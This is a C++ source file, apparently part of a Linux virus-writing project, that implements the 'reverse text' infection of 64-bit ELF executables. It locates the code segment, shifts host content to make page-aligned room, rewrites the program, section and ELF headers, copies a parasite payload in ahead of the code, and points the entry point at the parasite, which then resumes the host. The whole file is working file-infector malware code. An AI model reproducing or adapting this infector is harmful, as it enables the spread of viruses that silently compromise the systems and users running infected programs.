#include "infector/reverse_text_infect.hh"
#include <linux/elf.h>
#include <linux/limits.h>
#include "common/file_descriptor.hh"
#include "common/patch_pattern.hh"
#include "common/patch_relinguish_control.hh"
#include "std/string.hh"

namespace vt::infector {
namespace {
struct ElfReverseTextInfo {
  Elf64_Addr original_e_entry;
  Elf64_Addr original_code_segment_p_vaddr;
  Elf64_Addr original_code_segment_file_offset;
  size_t code_segment_idx;
  bool code_segment_includes_ehdr_and_phdr;
};

uint64_t round_up_to_page(uint64_t v) { return (v & ~(4096 - 1)) + 4096; }

bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
               size_t padded_virus_size) {
  // Point shdr (Pointer to iterate over SHT)
  auto section_entry_start = &shdr;

  for (auto cur_entry = section_entry_start;
       cur_entry < section_entry_start + ehdr.e_shnum; ++cur_entry) {
    if (cur_entry->sh_offset) {
      // avoid patching special sections for example the very first null
      // section.
      cur_entry->sh_offset += padded_virus_size;
    }
  }
  return true;
}

void patch_phdr(const Elf64_Ehdr& ehdr, Elf64_Phdr& phdr,
                uint64_t padded_virus_size, const ElfReverseTextInfo& info) {
  auto pht_entry_count = ehdr.e_phnum;

  // Point to first phdr
  auto phdr_entry = &phdr;

  // For other entries that has p_offset after CODE segment, shift them.
  for (size_t idx = 0; idx < pht_entry_count; idx++) {
    auto cur_entry = phdr_entry + idx;
    if (idx == info.code_segment_idx) {
      // Sometimes RX segment loads from offset 0 to the end of all CODE
      // sections. It includes ehdr, virus, phdr and executable sections.
      // Therefore we don't need to shift the file offset here. It's also
      // possible that RX segment has a non-zero file offset, with one readonly
      // section preceeding it, loading ehdr, phdr and sections before .text. In
      // that case, increase the file size for that section and offset for code.
      if (cur_entry->p_offset) {
        cur_entry->p_offset += padded_virus_size;
      }
      if (cur_entry->p_vaddr) {
        cur_entry->p_vaddr -= padded_virus_size;
      }
      if (cur_entry->p_paddr) {
        cur_entry->p_paddr -= padded_virus_size;
      }

      // extending CODE segment
      cur_entry->p_filesz += padded_virus_size;
      cur_entry->p_memsz += padded_virus_size;
    } else if (cur_entry->p_offset > info.original_code_segment_file_offset &&
               cur_entry->p_filesz) {
      // shift file offset for all other segments execept special ones like
      // GNU_STACK.
      cur_entry->p_offset += padded_virus_size;
    } else if (!cur_entry->p_offset && cur_entry->p_filesz) {
      // For none CODE segment, that has none zero start and a file size,
      // it's likely loading ehdr + phdr + readonly segments.
      cur_entry->p_filesz += padded_virus_size;
      cur_entry->p_memsz += padded_virus_size;
    }
  }
}

void patch_ehdr(Elf64_Ehdr& ehdr, const ElfReverseTextInfo& info,
                uint64_t padded_virus_size) {
  if (ehdr.e_type == ET_EXEC) {
    if (info.code_segment_includes_ehdr_and_phdr) {
      // LOAD RX
      //  ehdr
      //  virus  <-
      //  phdr
      ehdr.e_entry = info.original_code_segment_p_vaddr - padded_virus_size +
                     sizeof(Elf64_Ehdr);
    } else {
      // LOAD R
      //  ehdr
      //  phdr
      //  readonly sections
      // LOAD RX
      //  virus  <-
      //  text section
      ehdr.e_entry = info.original_code_segment_p_vaddr - padded_virus_size;
    }
  } else if (ehdr.e_type == ET_DYN) {
    ehdr.e_entry = sizeof(Elf64_Ehdr);
  } else {
    CHECK_FAIL();
  }
  ehdr.e_shoff += padded_virus_size;
  ehdr.e_phoff += padded_virus_size;
}

bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
              ElfReverseTextInfo& info) {
  info.original_e_entry = ehdr.e_entry;
  // Point to first entry in PHT
  const Elf64_Phdr* phdr_entry = &phdr;

  // Parse PHT entries
  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
    // Find the CODE Segment (containing RX section)
    if (phdr_entry->p_type == PT_LOAD && phdr_entry->p_flags == (PF_R | PF_X)) {
      info.code_segment_idx = i;
      info.original_code_segment_p_vaddr = phdr_entry->p_vaddr;
      info.original_code_segment_file_offset = phdr_entry->p_offset;
      if (phdr_entry->p_offset == 0) {
        // The CODE segment includes everything from ehdr, phdr and other
        // sections before .text.
        info.code_segment_includes_ehdr_and_phdr = true;
      }
      return true;
    }
  }

  return false;
}

void inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                  const vt::common::Mmap<PROT_READ>& parasite_mapping,
                  const Elf64_Ehdr& ehdr, uint64_t padded_virus_size,
                  const ElfReverseTextInfo& info) {
  Elf64_Addr insert_start{};
  if (info.code_segment_includes_ehdr_and_phdr) {
    // CODE segment includes ehdr, phdr, readonly sections and text. It must
    // start from 0 file offset.
    CHECK_EQ(info.original_code_segment_file_offset, 0);
    insert_start = sizeof(Elf64_Ehdr);
  } else {
    // CODE segment has none-zero file offset
    insert_start = info.original_code_segment_file_offset;
  }
  // Shift old content back.
  memcpy(host_mapping.mutable_base() + insert_start + padded_virus_size,
         host_mapping.mutable_base() + insert_start,
         host_mapping.size() - padded_virus_size - insert_start);
  // Clear old content. Not required.
  memset(host_mapping.mutable_base() + insert_start, 0x00, padded_virus_size);

  // Inject the virus.
  memcpy(host_mapping.mutable_base() + insert_start, parasite_mapping.base(),
         parasite_mapping.size());
}

}  // namespace

bool reverse_text_infect64(
    vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
    vt::common::Mmap<PROT_READ> parasite_mapping) {
  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  if (ehdr.e_type == ET_REL || ehdr.e_type == ET_CORE ||
      ehdr.e_ident[EI_CLASS] == ELFCLASS32) {
    return false;
  }

  ElfReverseTextInfo info{};
  auto& phdr =
      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);

  if (!get_info(ehdr, phdr, info)) {
    printf("Cannot correctly parse host elf phdr\n");
    return false;
  }

  auto padded_virus_size = round_up_to_page(parasite_mapping.size());

  {
    auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
        host_mapping.mutable_base() + ehdr.e_phoff);
    patch_phdr(ehdr, mutable_phdr, padded_virus_size, info);
  }

  {
    auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
        host_mapping.mutable_base() + ehdr.e_shoff);
    patch_sht(ehdr, mutable_shdr, padded_virus_size);
  }

  {
    // Patch elf header last
    auto& mutable_ehdr =
        *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
    patch_ehdr(mutable_ehdr, info, padded_virus_size);
  }

  // Shift host content back, starting from the beginning of CODE segment start.
  printf("host size %x extra space %x\n", host_mapping.size(),
         padded_virus_size);

  inject_virus(host_mapping, parasite_mapping, ehdr, padded_virus_size, info);

  // Patch parasite to resume host code after execution.
  return patch_parasite_and_relinquish_control(
      ehdr.e_type, info.original_e_entry, ehdr.e_entry, sizeof(elf64_hdr),
      parasite_mapping.size(), host_mapping);
}

size_t ReverseTextInfect::output_size(size_t host_size, size_t parasite_size) {
  return host_size + round_up_to_page(parasite_size);
}

}  // namespace vt::infector
